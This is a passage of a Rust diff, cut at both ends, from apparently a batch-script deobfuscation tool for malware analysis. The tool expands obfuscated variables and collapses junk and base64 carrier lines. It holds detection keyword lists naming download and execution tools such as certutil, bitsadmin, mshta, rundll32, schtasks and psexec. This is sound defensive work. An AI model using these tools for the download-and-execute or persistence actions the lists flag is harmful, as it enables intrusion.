+    let length = if bytes.get(idx).copied() == Some(b',') {
+        idx += 1;
+        skip_fast_ascii_whitespace(bytes, &mut idx);
+        Some(parse_fast_i64(bytes, &mut idx)?)
+    } else {
+        None
+    };
+    skip_fast_ascii_whitespace(bytes, &mut idx);
+    (idx == bytes.len()).then_some((start, length))
+}
+
+fn skip_fast_ascii_whitespace(bytes: &[u8], idx: &mut usize) {
+    while bytes
+        .get(*idx)
+        .copied()
+        .is_some_and(|b| b.is_ascii_whitespace())
+    {
+        *idx += 1;
+    }
+}
+
+fn parse_fast_i64(bytes: &[u8], idx: &mut usize) -> Option<i64> {
+    let mut sign = 1i64;
+    if bytes.get(*idx).copied() == Some(b'-') {
+        sign = -1;
+        *idx += 1;
+    }
+    let start = *idx;
+    let mut value = 0i64;
+    while let Some(b) = bytes.get(*idx).copied() {
+        if !b.is_ascii_digit() {
+            break;
+        }
+        value = value.checked_mul(10)?.checked_add(i64::from(b - b'0'))?;
+        *idx += 1;
+    }
+    (*idx > start).then_some(value * sign)
+}
+
+fn fast_expand_simple_percent_line(line: &str, env: &Environment) -> Option<String> {
+    const MAX_SIMPLE_PERCENT_LINE_BYTES: usize = 256 * 1024;
+
+    if line.len() > MAX_SIMPLE_PERCENT_LINE_BYTES
+        || !line.contains('%')
+        || line.contains(['!', '^', '&', '|', '<', '>'])
+    {
+        return None;
+    }
+
+    let mut out = String::with_capacity(line.len());
+    let mut literal_only = String::with_capacity(line.len());
+    let mut cursor = 0usize;
+    let mut refs = 0usize;
+    while cursor < line.len() {
+        let rest = &line[cursor..];
+        let Some(first) = rest.chars().next() else {
+            break;
+        };
+        if first != '%' {
+            out.push(first);
+            literal_only.push(first);
+            cursor += first.len_utf8();
+            continue;
+        }
+
+        let name_start = cursor + 1;
+        let close_rel = line[name_start..].find('%')?;
+        let inner = &line[name_start..name_start + close_rel];
+        if inner.is_empty() {
+            return None;
+        }
+        let expanded = if let Some((name, op)) = inner.split_once(':') {
+            if !simple_percent_name_allowed(name) {
+                return None;
+            }
+            let value =
+                crate::normalize::env_get_for_var_expansion(env, name, true).unwrap_or_default();
+            if let Some((index, length)) = parse_fast_percent_substr_op(op) {
+                crate::normalize::apply_substr(&value, index, length)
+            } else {
+                let (needle, replacement) = op.split_once('=')?;
+                let (wildcard, needle) = needle
+                    .strip_prefix('*')
+                    .map_or((false, needle), |needle| (true, needle));
+                crate::normalize::apply_substitute(&value, needle, replacement, wildcard)
+            }
+        } else {
+            if !simple_percent_name_allowed(inner) {
+                return None;
+            }
+            env.get(inner).unwrap_or_default()
+        };
+        out.push_str(&expanded);
+        refs += 1;
+        cursor = name_start + close_rel + 1;
+    }
+
+    let chosen = if should_prefer_literal_percent_noise_echo(&out, &literal_only) {
+        literal_only
+    } else {
+        out
+    };
+    (refs > 0 && !chosen.contains('%') && !expanded_line_needs_raw_pre_dispatch(&chosen))
+        .then_some(chosen)
+}
+
+fn fast_expand_delayed_set_alias_line(line: &str, env: &Environment) -> Option<String> {
+    if !env.delayed_expansion || !line.starts_with('!') {
+        return None;
+    }
+    let close = line[1..].find('!')? + 1;
+    let name = &line[1..close];
+    if !simple_percent_name_allowed(name) {
+        return None;
+    }
+    let rest = &line[close + 1..];
+    if rest.is_empty()
+        || !rest.as_bytes().first().is_some_and(u8::is_ascii_whitespace)
+        || rest.contains('!')
+        || rest.contains('%')
+        || rest.contains(['&', '|', '<', '>'])
+    {
+        return None;
+    }
+    let value = env.get(name)?;
+    if !value.trim().eq_ignore_ascii_case("set") {
+        return None;
+    }
+    Some(format!("set{rest}"))
+}
+
+fn repair_powershell_launcher_flag_spacing(line: String) -> String {
+    let line = insert_space_before_powershell_after_glued_start_option(line);
+    let command_start = line
+        .char_indices()
+        .find_map(|(idx, ch)| (!ch.is_whitespace() && ch != '@').then_some(idx))
+        .unwrap_or(line.len());
+    let command_tail = &line[command_start..];
+    let command_end = command_tail
+        .char_indices()
+        .find_map(|(idx, ch)| ch.is_whitespace().then_some(idx))
+        .unwrap_or(command_tail.len());
+    let command = &command_tail[..command_end];
+    let command_lower = command.to_ascii_lowercase();
+    let line_lower = line.to_ascii_lowercase();
+    let command_is_glued_powershell = matches!(
+        command_lower.as_str(),
+        s if s.starts_with("powershell-")
+            || s.starts_with("powershell.exe-")
+            || s.starts_with("pwsh-")
+            || s.starts_with("pwsh.exe-")
+    );
+    let set_value_is_glued_powershell = command_lower == "set"
+        && (line_lower.contains("=powershell-")
+            || line_lower.contains("=powershell.exe-")
+            || line_lower.contains("=pwsh-")
+            || line_lower.contains("=pwsh.exe-"));
+    let line_contains_glued_powershell = line_lower.contains("powershell-")
+        || line_lower.contains("powershell.exe-")
+        || line_lower.contains("pwsh-")
+        || line_lower.contains("pwsh.exe-");
+    if !command_is_glued_powershell
+        && !set_value_is_glued_powershell
+        && !line_contains_glued_powershell
+    {
+        return line;
+    }
+
+    const PS_FLAG_NAMES: &[&str] = &[
+        "PSConsoleFile",
+        "Version",
+        "NoLogo",
+        "NoExit",
+        "Sta",
+        "Mta",
+        "NoProfile",
+        "NonInteractive",
+        "InputFormat",
+        "OutputFormat",
+        "WindowStyle",
+        "EncodedCommand",
+        "ConfigurationName",
+        "ExecutionPolicy",
+        "Command",
+        "File",
+        "SettingsFile",
+        "Help",
+    ];
+
+    let mut out = String::with_capacity(line.len() + 8);
+    for (idx, ch) in line.char_indices() {
+        if ch == '-'
+            && idx > 0
+            && line[..idx]
+                .chars()
+                .next_back()
+                .is_some_and(|prev| !prev.is_whitespace())
+            && (PS_FLAG_NAMES
+                .iter()
+                .any(|flag| starts_with_ascii_case_insensitive(&line[idx + 1..], flag))
+                || powershell_short_flag_needs_spacing(&line[idx + 1..]))
+        {
+            out.push(' ');
+        }
+        out.push(ch);
+    }
+    out
+}
+
+fn insert_space_before_powershell_after_glued_start_option(line: String) -> String {
+    let mut out = String::with_capacity(line.len() + 4);
+    let mut cursor = 0usize;
+    while cursor < line.len() {
+        let Some(pos) = next_powershell_launcher_pos(&line, cursor) else {
+            out.push_str(&line[cursor..]);
+            break;
+        };
+        out.push_str(&line[cursor..pos]);
+        if pos > 0
+            && line
+                .as_bytes()
+                .get(pos - 1)
+                .is_some_and(|byte| !byte.is_ascii_whitespace())
+            && prefix_ends_with_glued_start_option(&line[..pos])
+        {
+            out.push(' ');
+        }
+        let launcher_len = powershell_launcher_len_at(&line[pos..]).unwrap_or(1);
+        out.push_str(&line[pos..pos + launcher_len]);
+        cursor = pos + launcher_len;
+    }
+    out
+}
+
+fn next_powershell_launcher_pos(line: &str, start: usize) -> Option<usize> {
+    ["powershell.exe", "powershell", "pwsh.exe", "pwsh"]
+        .iter()
+        .filter_map(|needle| crate::util::find_ascii_case_insensitive_from(line, needle, start))
+        .min()
+}
+
+fn powershell_launcher_len_at(text: &str) -> Option<usize> {
+    ["powershell.exe", "powershell", "pwsh.exe", "pwsh"]
+        .iter()
+        .find(|needle| starts_with_ascii_case_insensitive(text, needle))
+        .map(|needle| needle.len())
+}
+
+fn prefix_ends_with_glued_start_option(prefix: &str) -> bool {
+    let trimmed = prefix.trim_end();
+    ["/min", "/max", "/b"].iter().any(|option| {
+        trimmed
+            .as_bytes()
+            .get(trimmed.len().saturating_sub(option.len())..)
+            .is_some_and(|suffix| suffix.eq_ignore_ascii_case(option.as_bytes()))
+    })
+}
+
+fn powershell_short_flag_needs_spacing(tail: &str) -> bool {
+    let mut chars = tail.chars();
+    matches!(chars.next(), Some('w' | 'W'))
+        && chars
+            .next()
+            .is_some_and(|ch| ch.is_whitespace() || ch == '"' || ch == '\'')
+}
+
+fn simple_percent_name_allowed(name: &str) -> bool {
+    !name.is_empty()
+        && name
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_'))
+}
+
+fn expanded_line_needs_raw_pre_dispatch(line: &str) -> bool {
+    let Some(name) = interp::command_name(line) else {
+        return false;
+    };
+    let name = name
+        .trim_start_matches(['@', '"', '(', '\''])
+        .trim_matches(['"', '\'']);
+    let basename = name.rsplit(['\\', '/']).next().unwrap_or(name);
+    let lower = basename.trim_end_matches(".exe").to_ascii_lowercase();
+    matches!(
+        lower.as_str(),
+        "cmd"
+            | "for"
+            | "forfiles"
+            | "conhost"
+            | "if"
+            | "wmic"
+            | "start"
+            | "bitsadmin"
+            | "at"
+            | "call"
+            | "psexec"
+            | "winrs"
+            | "winrm"
+            | "sc"
+    )
 }
 
 fn fast_expand_percent_var_chain_line(line: &str, env: &Environment) -> Option<String> {
@@ -10099,7 +14546,111 @@ fn fast_expand_percent_var_chain_line(line: &str, env: &Environment) -> Option<S
         cursor = name_end + 1;
     }
 
+    if out.contains('%') {
+        out = expand_nested_simple_percent_refs_in_var_chain_output(&out, env)
+            .or_else(|| percent_refs_are_batch_meta_or_powershell_literals(&out).then_some(out))?;
+    }
+
     (refs >= 16).then_some(out)
+}
+
+fn percent_refs_are_batch_meta_or_powershell_literals(line: &str) -> bool {
+    let mut cursor = 0usize;
+    let mut saw_percent = false;
+    while cursor < line.len() {
+        let rest = &line[cursor..];
+        let Some(first) = rest.chars().next() else {
+            break;
+        };
+        if first != '%' {
+            cursor += first.len_utf8();
+            continue;
+        }
+        saw_percent = true;
+        let Some(next) = line[cursor + 1..].chars().next() else {
+            return false;
+        };
+        match next {
+            '%' => {
+                cursor += 2;
+            }
+            '*' => {
+                cursor += 2;
+            }
+            '~' => {
+                let mut end = cursor + 2;
+                while end < line.len() {
+                    let Some(ch) = line[end..].chars().next() else {
+                        break;
+                    };
+                    if ch.is_ascii_alphanumeric() || matches!(ch, '$' | ':' | '~') {
+                        end += ch.len_utf8();
+                        continue;
+                    }
+                    break;
+                }
+                if end == cursor + 2 {
+                    return false;
+                }
+                cursor = end;
+            }
+            ch if ch.is_ascii_digit() => {
+                cursor += 1 + ch.len_utf8();
+            }
+            _ => return false,
+        }
+    }
+    saw_percent
+}
+
+fn expand_nested_simple_percent_refs_in_var_chain_output(
+    line: &str,
+    env: &Environment,
+) -> Option<String> {
+    let mut out = String::with_capacity(line.len());
+    let mut cursor = 0usize;
+    let mut refs = 0usize;
+    while cursor < line.len() {
+        let rest = &line[cursor..];
+        let Some(first) = rest.chars().next() else {
+            break;
+        };
+        if first != '%' {
+            out.push(first);
+            cursor += first.len_utf8();
+            continue;
+        }
+
+        let name_start = cursor + 1;
+        let Some(next) = line[name_start..].chars().next() else {
+            out.push('%');
+            cursor += 1;
+            continue;
+        };
+        if !(next.is_ascii_alphabetic() || next == '_') {
+            out.push('%');
+            cursor += 1;
+            continue;
+        }
+        let Some(close_rel) = line[name_start..].find('%') else {
+            out.push('%');
+            cursor += 1;
+            continue;
+        };
+        let name_end = name_start + close_rel;
+        let name = &line[name_start..name_end];
+        if !simple_percent_name_allowed(name) {
+            out.push('%');
+            cursor += 1;
+            continue;
+        }
+        let value = crate::normalize::env_get_for_var_expansion(env, name, true)?;
+        out.push_str(&value);
+        refs += 1;
+        cursor = name_end + 1;
+    }
+
+    (refs > 0).then_some(out)
 }
 
 fn render_fast_percent_chain_logical_line(
@@ -10123,28 +14674,428 @@ fn render_fast_percent_chain_logical_line(
             original_len: normalized.len() as u64,
         });
         out.push_str(&format!(
-            "::==== harrington: omitted {} bytes from hash-prefixed carrier line ====\r\n",
+            "rem omitted {} bytes from hash-prefixed carrier line\r\n",
             normalized.len()
         ));
     }
     true
 }
 
+fn render_fast_percent_substr_noise_line(
+    expanded: &str,
+    raw_len: usize,
+    env: &mut Environment,
+    out: &mut String,
+    line_output_elided: bool,
+) -> bool {
+    const MIN_EXPANDED_NOISE_BYTES: usize = 8192;
+
+    if expanded.len() < MIN_EXPANDED_NOISE_BYTES {
+        return false;
+    }
+    if fast_percent_expansion_has_actionable_atom(expanded) {
+        return false;
+    }
+
+    let stripped = crate::marker_noise::strip_line(expanded);
+    let candidate = if stripped.trim().len() < expanded.trim().len() {
+        stripped.trim()
+    } else {
+        expanded.trim()
+    };
+    if candidate.is_empty() {
+        return false;
+    }
+    if fast_percent_expansion_has_actionable_atom(candidate) {
+        return false;
+    }
+    if interp::command_name(candidate)
+        .as_deref()
+        .and_then(crate::handlers::lookup)
+        .is_some()
+    {
+        return false;
+    }
+
+    if !line_output_elided {
+        rescue_truncated_urls(candidate, raw_len.max(expanded.len()), env);
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: raw_len as u64,
+        });
+        out.push_str(&format!(
+            "rem omitted dense percent-substring carrier line ({} source bytes, {} expanded bytes",
+            raw_len,
+            expanded.len()
+        ));
+        if stripped.len() < expanded.len() {
+            out.push_str(&format!(
+                ", {} bytes after marker stripping",
+                stripped.len()
+            ));
+        }
+        out.push_str(")\r\n");
+    }
+    true
+}
+
+fn fast_percent_expansion_has_actionable_atom(text: &str) -> bool {
+    [
+        "http://",
+        "https://",
+        "ftp://",
+        "powershell",
+        "pwsh",
+        "downloadstring",
+        "downloadfile",
+        "invoke-webrequest",
+        "certutil",
+        "bitsadmin",
+        "mshta",
+        "wscript",
+        "cscript",
+        "rundll32",
+        "reg add",
+        "schtasks",
+    ]
+    .iter()
+    .any(|needle| crate::util::contains_ascii_case_insensitive(text, needle))
+}
+
+fn render_known_marker_base64_carrier_line(
+    logical: &str,
+    markers: &[String],
+    env: &mut Environment,
+    out: &mut String,
+    line_output_elided: bool,
+) -> bool {
+    const MIN_B64_RUN: usize = 4096;
+    const MAX_B64_RUN: usize = 16 * 1024 * 1024;
+
+    let trimmed = logical.trim();
+    if trimmed.len() < MIN_B64_RUN || trimmed.len() > MAX_B64_RUN {
+        return false;
+    }
+    if markers.is_empty() {
+        return false;
+    }
+
+    let Some((marker, encoded_len, decoded_estimate)) = markers.iter().find_map(|marker| {
+        let payload = trimmed.strip_prefix(marker)?;
+        let (encoded_len, decoded_estimate) = marker_carrier_encoded_estimate(payload)?;
+        (MIN_B64_RUN..=MAX_B64_RUN)
+            .contains(&encoded_len)
+            .then_some((marker, encoded_len, decoded_estimate))
+    }) else {
+        return false;
+    };
+
+    if !line_output_elided {
+        let leading_len = logical.find(trimmed).unwrap_or(0);
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: logical.len() as u64,
+        });
+        out.push_str(&logical[..leading_len]);
+        out.push_str(&format!(
+            "rem omitted self-read marker carrier ({} marker bytes, {} base64 bytes, ~{} decoded bytes)",
+            marker.len(),
+            encoded_len,
+            decoded_estimate
+        ));
+        out.push_str("\r\n");
+    }
+    true
+}
+
+fn marker_carrier_encoded_estimate(payload: &str) -> Option<(usize, usize)> {
+    const MIN_CHUNK: usize = 80;
+
+    if payload.bytes().all(is_base64_carrier_byte) {
+        let padding = payload.bytes().rev().take_while(|b| *b == b'=').count();
+        let decoded_estimate = (payload.len() / 4)
+            .saturating_mul(3)
+            .saturating_sub(padding);
+        return Some((payload.len(), decoded_estimate));
+    }
+
+    let mut encoded_len = 0usize;
+    let mut decoded_estimate = 0usize;
+    let mut chunks = 0usize;
+    for chunk in payload.split('\\') {
+        if chunk.len() < MIN_CHUNK || !chunk.bytes().all(is_base64_carrier_byte) {
+            return None;
+        }
+        let padding = chunk.bytes().rev().take_while(|b| *b == b'=').count();
+        encoded_len = encoded_len.saturating_add(chunk.len());
+        decoded_estimate = decoded_estimate
+            .saturating_add((chunk.len() / 4).saturating_mul(3).saturating_sub(padding));
+        chunks += 1;
+    }
+    (chunks >= 2).then_some((encoded_len, decoded_estimate))
+}
+
+fn self_read_marker_prefixes(text: &str) -> Vec<String> {
+    use once_cell::sync::Lazy;
+
+    #[expect(clippy::expect_used, reason = "static regex construction")]
+    static STARTSWITH_MARKER_RE: Lazy<regex::Regex> = Lazy::new(|| {
+        regex::Regex::new(r#"(?is)\bStartsWith\s*\(\s*['"]([A-Za-z0-9\+/\=]{4,64})['"]\s*\)"#)
+            .expect("startswith marker re")
+    });
+
+    let mut markers = Vec::new();
+    for caps in STARTSWITH_MARKER_RE.captures_iter(text) {
+        let Some(marker) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        if marker
+            .strip_prefix("::")
+            .unwrap_or(marker)
+            .bytes()
+            .all(is_base64_carrier_byte)
+            && !markers.iter().any(|existing| existing == marker)
+        {
+            markers.push(marker.to_string());
+        }
+    }
+    markers
+}
+
+fn logical_line_is_single_char_set_dictionary(commands: &[String]) -> bool {
+    commands
+        .iter()
+        .filter(|command| single_char_set_assignment(command).is_some())
+        .count()
+        >= 8
+}
+
+fn logical_line_builds_setp_payload(logical: &str, commands: &[String]) -> bool {
+    if commands.len() < 3 {
+        return false;
+    }
+    let set_count = caret_stripped_set_command_count(logical);
+    set_count >= 2 && raw_logical_has_setp_payload_redirect(logical)
+}
+
+fn caret_stripped_set_command_count(logical: &str) -> usize {
+    let unescaped = logical.replace('^', "");
+    split::split_commands(&unescaped)
+        .iter()
+        .filter(|command| set_assignment(command).is_some())
+        .count()
+}
+
+fn raw_logical_has_setp_payload_redirect(logical: &str) -> bool {
+    let unescaped = logical.replace('^', "");
+    let lower = unescaped.to_ascii_lowercase();
+    (lower.contains("set/p") || lower.contains("set /p"))
+        && lower.contains("<nul")
+        && lower.contains('>')
+}
+
+fn single_char_set_assignment(command: &str) -> Option<(&str, &str)> {
+    let trimmed = command.trim_start_matches(|c: char| {
+        c == '@' || c == '(' || c == ';' || c == ',' || c.is_whitespace()
+    });
+    let rest = crate::handlers::util::strip_keyword_ci(trimmed, "set", b"=/ \t")?;
+    if rest.trim_start().starts_with('/') {
+        return None;
+    }
+    let (name, value) = rest.trim_start().split_once('=')?;
+    let name = name.trim();
+    let value = value.trim();
+    if name.is_empty() || !name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-') {
+        return None;
+    }
+    let mut chars = value.chars();
+    let ch = chars.next()?;
+    if chars.next().is_some() || !ch.is_ascii_alphanumeric() {
+        return None;
+    }
+    Some((name, value))
+}
+
+fn is_short_fragment_set_spam(command: &str, env: &Environment) -> bool {
+    let Some((_name, value)) = set_assignment(command) else {
+        return false;
+    };
+    let value = strip_outer_set_quotes(value.trim());
+    if value.eq_ignore_ascii_case("set ") || value.eq_ignore_ascii_case("set") {
+        return true;
+    }
+    if value.len() > 24 || value.contains("://") {
+        return false;
+    }
+    env.vars_iter().any(|(_name, existing)| {
+        existing.eq_ignore_ascii_case("set ") || existing.eq_ignore_ascii_case("set")
+    })
+}
+
+fn set_assignment(command: &str) -> Option<(&str, &str)> {
+    let trimmed = command.trim_start_matches(|c: char| {
+        c == '@' || c == '(' || c == ';' || c == ',' || c.is_whitespace()
+    });
+    let rest = crate::handlers::util::strip_keyword_ci(trimmed, "set", b"=/ \t")?;
+    if rest.trim_start().starts_with('/') {
+        return None;
+    }
+    let rest = rest.trim_start();
+    let (name, value) = if let Some(quoted) = rest.strip_prefix('"') {
+        let (inner, _tail) = quoted.split_once('"').unwrap_or((quoted, ""));
+        inner.split_once('=')?
+    } else {
+        rest.split_once('=')?
+    };
+    let name = name.trim();
+    if name.is_empty() {
+        return None;
+    }
+    Some((name, value))
+}
+
+fn seed_large_encoded_set_assignments_from_text(text: &str, env: &mut Environment) {
+    for line in text.lines() {
+        let Some((name, value)) = set_assignment(line) else {
+            continue;
+        };
+        let value = strip_outer_set_quotes(value.trim());
+        if value.len() < 256 {
+            continue;
+        }
+        let encoded = value.bytes().filter(|b| is_base64_carrier_byte(*b)).count();
+        if encoded * 100 < value.len() * 95 {
+            continue;
+        }
+        env.seed(name, value);
+    }
+}
+
+fn strip_outer_set_quotes(value: &str) -> &str {
+    value
+        .strip_prefix('"')
+        .and_then(|v| v.strip_suffix('"'))
+        .unwrap_or(value)
+}
+
+fn is_inert_fragment_value_noise(line: &str) -> bool {
+    let trimmed = line.trim();
+    if trimmed.is_empty()
+        || trimmed.contains("://")
+        || trimmed.contains(r"\\")
+        || trimmed.contains(['%', '!', '<', '>', '|', '&', '"'])
+    {
+        return false;
+    }
+    if let Some(name) = interp::command_name(trimmed) {
+        if crate::handlers::lookup(&name).is_some() {
+            return false;
+        }
+    }
+    if is_executable_or_script_token(trimmed) {
+        return false;
+    }
+    if is_windows_drive_path(trimmed) && trimmed.ends_with(['\\', '/']) {
+        return true;
+    }
+    trimmed.split_whitespace().count() == 1
+        && trimmed.contains('.')
+        && trimmed
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '_' || c == '-')
+}
+
+fn is_windows_drive_path(token: &str) -> bool {
+    let bytes = token.as_bytes();
+    bytes.len() >= 3
+        && bytes[0].is_ascii_alphabetic()
+        && bytes[1] == b':'
+        && matches!(bytes[2], b'\\' | b'/')
+}
+
+fn is_executable_or_script_token(token: &str) -> bool {
+    let token = token.trim_matches('"').to_ascii_lowercase();
+    [
+        ".bat", ".cmd", ".com", ".exe", ".hta", ".js", ".jse", ".ps1", ".vbe", ".vbs", ".wsf",
+    ]
+    .iter()
+    .any(|ext| token.ends_with(ext))
+}
+
+fn is_plain_word_salad_after_halt(line: &str) -> bool {
+    let trimmed = line.trim_start();
+    if let Some(payload) = trimmed
+        .get(..5.min(trimmed.len()))
+        .filter(|prefix| prefix.eq_ignore_ascii_case("echo "))
+        .map(|_| &trimmed[5..])
+        .or_else(|| {
+            trimmed
+                .get(..4)
+                .filter(|prefix| prefix.eq_ignore_ascii_case("echo"))
+                .map(|_| &trimmed[4..])
+        })
+    {
+        return is_plain_word_salad_shape(payload, true)
+            || is_rendered_plain_word_salad_noise_line(payload);
+    }
+    is_plain_word_salad_shape(line, true)
+}
+
+fn is_plain_word_salad_shape(line: &str, allow_known_command_word: bool) -> bool {
+    let trimmed = line.trim();
+    if trimmed.is_empty()
+        || trimmed.contains("://")
+        || trimmed.contains(r"\\")
+        || trimmed.contains(['%', '!', '/', '\\', '.', ':', '=', '<', '>', '|', '&', '"'])
+    {
+        return false;
+    }
+    if let Some(name) = interp::command_name(trimmed) {
+        if !allow_known_command_word && crate::handlers::lookup(&name).is_some() {
+            return false;
+        }
+    }
+    trimmed
+        .chars()
+        .all(|c| c.is_ascii_alphabetic() || c.is_ascii_whitespace() || c == '-')
+}
+
 fn summarize_long_alpha_echo_line(line: &str, env: &mut Environment) -> Option<String> {
     const MIN_SUMMARY_BYTES: usize = 1024;
+    const MIN_AUTO_SUMMARY_LINE_BYTES: usize = 64 * 1024;
 
-    let limit = env.limits.max_output_line_bytes;
-    if limit == 0 || line.len() as u64 <= limit {
+    if line.len() < MIN_AUTO_SUMMARY_LINE_BYTES
+        && (env.limits.max_output_line_bytes == 0
+            || line.len() as u64 <= env.limits.max_output_line_bytes)
+    {
         return None;
     }
 
-    let trimmed = line.trim_start_matches(['@', ' ', '\t']);
-    let lower = trimmed.get(..5)?.to_ascii_lowercase();
-    if lower != "echo " {
+    let comment_prefixed = line.trim_start_matches(['@', ' ', '\t']).starts_with('#');
+    let trimmed = line.trim_start_matches(['@', '#', ' ', '\t']);
+    let lower = trimmed.get(..5.min(trimmed.len()))?.to_ascii_lowercase();
+    let payload = if lower == "echo " {
+        &trimmed[5..]
+    } else if trimmed
+        .get(..4)
+        .is_some_and(|prefix| prefix.eq_ignore_ascii_case("echo"))
+    {
+        &trimmed[4..]
+    } else {
+        return None;
+    };
+    let alpha_noise = is_alpha_noise_payload(payload);
+    let repetitive_noise = !alpha_noise && is_repetitive_echo_noise_payload(payload);
+    if payload.len() < MIN_SUMMARY_BYTES || (!alpha_noise && !repetitive_noise) {
         return None;
     }
-    let payload = &trimmed[5..];
-    if payload.len() < MIN_SUMMARY_BYTES || !is_alpha_noise_payload(payload) {
+    if env.limits.max_output_line_bytes == 0
+        && !comment_prefixed
+        && !repetitive_noise
+        && !is_very_long_plain_alpha_noise_payload(payload)
+        && (!alpha_noise
+            || (!is_auto_alpha_echo_noise_payload(payload)
+                && !is_low_alphabet_alpha_echo_noise_payload(payload)
+                && !is_repetitive_alpha_echo_noise_payload(payload)))
+    {
         return None;
     }
 
@@ -10152,14 +15103,658 @@ fn summarize_long_alpha_echo_line(line: &str, env: &mut Environment) -> Option<S
     env.traits.push(crate::traits::Trait::LineTruncated {
         original_len: line.len() as u64,
     });
+    let kind = if repetitive_noise {
+        "repetitive"
+    } else {
+        "alpha"
+    };
     Some(format!(
-        "::==== harrington: omitted {} bytes from long alpha echo line ====",
-        payload.len()
+        "rem omitted {} bytes from long {} echo line",
+        payload.len(),
+        kind
     ))
 }
 
+fn summarize_long_alpha_echo_lines(text: &str, env: &mut Environment) -> Option<String> {
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut pending_repetitive_echo = String::new();
+    let mut pending_repetitive_payload_bytes = 0usize;
+    let mut pending_repetitive_lines = 0usize;
+    let mut changed = false;
+
+    for line in text.split_inclusive('\n') {
+        let (body, eol) = split_line_ending(line);
+        if let Some(summary) = summarize_long_alpha_echo_line(body, env) {
+            let _ = flush_repetitive_echo_noise_run(
+                &mut out,
+                &mut pending_repetitive_echo,
+                &mut pending_repetitive_payload_bytes,
+                &mut pending_repetitive_lines,
+                env,
+            );
+            out.push_str(&summary);
+            out.push_str(eol);
+            changed = true;
+        } else if let Some(summary) = summarize_long_plain_alpha_noise_line(body, env) {
+            let _ = flush_repetitive_echo_noise_run(
+                &mut out,
+                &mut pending_repetitive_echo,
+                &mut pending_repetitive_payload_bytes,
+                &mut pending_repetitive_lines,
+                env,
+            );
+            out.push_str(&summary);
+            out.push_str(eol);
+            changed = true;
+        } else if let Some(payload_len) = repetitive_echo_noise_line_payload_len(body) {
+            pending_repetitive_echo.push_str(line);
+            pending_repetitive_payload_bytes += payload_len;
+            pending_repetitive_lines += 1;
+        } else {
+            changed |= flush_repetitive_echo_noise_run(
+                &mut out,
+                &mut pending_repetitive_echo,
+                &mut pending_repetitive_payload_bytes,
+                &mut pending_repetitive_lines,
+                env,
+            );
+            out.push_str(line);
+        }
+    }
+    changed |= flush_repetitive_echo_noise_run(
+        &mut out,
+        &mut pending_repetitive_echo,
+        &mut pending_repetitive_payload_bytes,
+        &mut pending_repetitive_lines,
+        env,
+    );
+
+    changed.then_some(out)
+}
+
+fn summarize_c_style_junkcode_echo_runs(text: &str, env: &mut Environment) -> Option<String> {
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut pending = String::new();
+    let mut pending_lines = 0usize;
+    let mut changed = false;
+
+    for line in text.split_inclusive('\n') {
+        let (body, _) = split_line_ending(line);
+        if is_c_style_junkcode_echo_line(body) {
+            pending.push_str(line);
+            pending_lines += 1;
+            continue;
+        }
+        changed |= flush_c_style_junkcode_echo_run(&mut out, &mut pending, &mut pending_lines, env);
+        out.push_str(line);
+    }
+    changed |= flush_c_style_junkcode_echo_run(&mut out, &mut pending, &mut pending_lines, env);
+
+    changed.then_some(out)
+}
+
+fn flush_c_style_junkcode_echo_run(
+    out: &mut String,
+    pending: &mut String,
+    pending_lines: &mut usize,
+    env: &mut Environment,
+) -> bool {
+    if pending.is_empty() {
+        return false;
+    }
+    if *pending_lines >= 32 && pending.len() >= 1024 {
+        rescue_truncated_urls(pending, pending.len(), env);
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: pending.len() as u64,
+        });
+        out.push_str(&format!(
+            "rem omitted {} C-style junkcode echo lines ({} bytes)\r\n",
+            *pending_lines,
+            pending.len()
+        ));
+        pending.clear();
+        *pending_lines = 0;
+        return true;
+    }
+    out.push_str(pending);
+    pending.clear();
+    *pending_lines = 0;
+    false
+}
+
+fn summarize_blank_echo_spacer_runs(text: &str, env: &mut Environment) -> Option<String> {
+    const MIN_BLANK_ECHO_RUN_LINES: usize = 32;
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut pending = String::new();
+    let mut pending_lines = 0usize;
+    let mut changed = false;
+
+    for line in text.split_inclusive('\n') {
+        let (body, _) = split_line_ending(line);
+        if is_blank_echo_spacer_line(body) {
+            pending.push_str(line);
+            pending_lines += 1;
+            continue;
+        }
+        changed |= flush_blank_echo_spacer_run(
+            &mut out,
+            &mut pending,
+            &mut pending_lines,
+            env,
+            MIN_BLANK_ECHO_RUN_LINES,
+        );
+        out.push_str(line);
+    }
+    changed |= flush_blank_echo_spacer_run(
+        &mut out,
+        &mut pending,
+        &mut pending_lines,
+        env,
+        MIN_BLANK_ECHO_RUN_LINES,
+    );
+
+    changed.then_some(out)
+}
+
+fn flush_blank_echo_spacer_run(
+    out: &mut String,
+    pending: &mut String,
+    pending_lines: &mut usize,
+    env: &mut Environment,
+    min_lines: usize,
+) -> bool {
+    if pending.is_empty() {
+        return false;
+    }
+    if *pending_lines >= min_lines {
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: pending.len() as u64,
+        });
+        out.push_str(&format!(
+            "rem omitted {} blank echo spacer lines ({} bytes)\r\n",
+            *pending_lines,
+            pending.len()
+        ));
+        pending.clear();
+        *pending_lines = 0;
+        return true;
+    }
+    out.push_str(pending);
+    pending.clear();
+    *pending_lines = 0;
+    false
+}
+
+fn is_blank_echo_spacer_line(line: &str) -> bool {
+    let trimmed = line.trim_start_matches(['@', ' ', '\t']).trim_end();
+    trimmed.eq_ignore_ascii_case("echo.")
+}
+
+fn summarize_long_plain_alpha_noise_line(line: &str, env: &mut Environment) -> Option<String> {
+    let trimmed = line.trim();
+    if trimmed.len() != line.len() || !is_very_long_plain_alpha_noise_payload(trimmed) {
+        return None;
+    }
+    rescue_truncated_urls(trimmed, line.len(), env);
+    env.traits.push(crate::traits::Trait::LineTruncated {
+        original_len: line.len() as u64,
+    });
+    Some(format!(
+        "rem omitted {} bytes from long plain alpha noise line",
+        trimmed.len()
+    ))
+}
+
+fn strip_unicode_marker_noise_lines(text: &str) -> Option<String> {
+    if text.is_ascii() {
+        return None;
+    }
+    let mut out = String::with_capacity(text.len());
+    let mut changed = false;
+    for chunk in text.split_inclusive('\n') {
